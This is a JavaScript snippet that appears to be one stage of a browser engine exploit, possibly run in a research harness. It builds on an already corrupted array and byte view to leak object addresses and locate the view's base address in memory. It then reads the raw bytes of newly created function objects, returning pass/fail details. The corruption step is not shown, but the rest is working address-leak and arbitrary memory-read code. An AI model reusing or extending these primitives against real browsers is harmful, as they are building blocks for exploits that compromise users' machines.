// Read-only inspection of newly allocated function cells using the measured
// object-property/view-base relationship from the running page.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_anchor_preflight_failed");
  var view = state.view;
  function matches(at, value) {
    return view[at] === (value & 255) &&
      view[at + 1] === (value >>> 8 & 255) &&
      view[at + 2] === (value >>> 16 & 255) &&
      view[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(view[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    var hex = "0x";
    for (var h = 7; h >= 0; h--)
      hex += bytes[h].toString(16).padStart(2, "0");
    return hex;
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  if (api && typeof api.markSync === "function")
    api.markSync("function_cells_base_calibrated");
  phase = "read_functions";
  function first(x) { return x + 11; }
  function second(x) { return x + 17; }
  state.functionCells = [first, second];
  var firstWord = wordOf(first);
  var secondWord = wordOf(second);
  var firstIndex = Number(firstWord) - base;
  var secondIndex = Number(secondWord) - base;
  if (!Number.isSafeInteger(firstIndex) || !Number.isSafeInteger(secondIndex) ||
      firstIndex < 0 || secondIndex < 0 ||
      firstIndex + 63 >= 4194304 || secondIndex + 63 >= 4194304)
    throw new Error("function_outside_window");
  function read64(at) {
    var out = "";
    for (var b = 0; b < 64; b++)
      out += view[at + b].toString(16).padStart(2, "0");
    return out;
  }
  var firstBytes = read64(firstIndex);
  var secondBytes = read64(secondIndex);
  var normal = first(5) === 16 && second(5) === 22;
  result = { id: "function_cell_read",
    status: normal && firstWord !== secondWord &&
      state.array[0] === state.a ? "pass" : "fail",
    details: { base: "0x" + base.toString(16),
      first_word: firstWord, first_index: firstIndex,
      second_word: secondWord, second_index: secondIndex,
      first_bytes: firstBytes, second_bytes: secondBytes,
      normal: normal, array_restored: state.array[0] === state.a } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "function_cell_read", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
